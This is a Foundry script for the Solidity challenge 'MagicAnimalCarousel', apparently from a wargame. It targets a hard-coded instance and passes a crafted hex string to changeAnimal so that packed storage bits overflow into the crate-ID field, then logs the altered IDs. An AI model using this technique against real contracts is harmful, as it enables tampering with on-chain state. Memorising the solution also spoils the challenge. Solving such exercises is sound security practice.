// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {MagicAnimalCarousel} from "src/33.MagicAnimalCarousel.sol";

contract MagicAnimalCarouselScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address instanceAddr = 0xAF7E091EF37B13d417e362CbFf5a25d52059f0Dd;

        MagicAnimalCarousel carousel = MagicAnimalCarousel(instanceAddr);

        carousel.setAnimalAndSpin("doge");

        string memory newAnimal = string(
            abi.encodePacked(hex"10000000000000000000ffff")
        );

        carousel.changeAnimal(newAnimal, 1);

        carousel.setAnimalAndSpin("pingu");

        uint256 currentCrateId = carousel.currentCrateId();
        console.log("Current Crate Id:", currentCrateId); // should be 65535

        uint256 nextCrateId = (carousel.carousel(currentCrateId) &
            (uint256(type(uint16).max) << 160)) >> 160;
        console.log("Next Crate Id:", nextCrateId); // should be 1

        vm.stopBroadcast();
    }
}
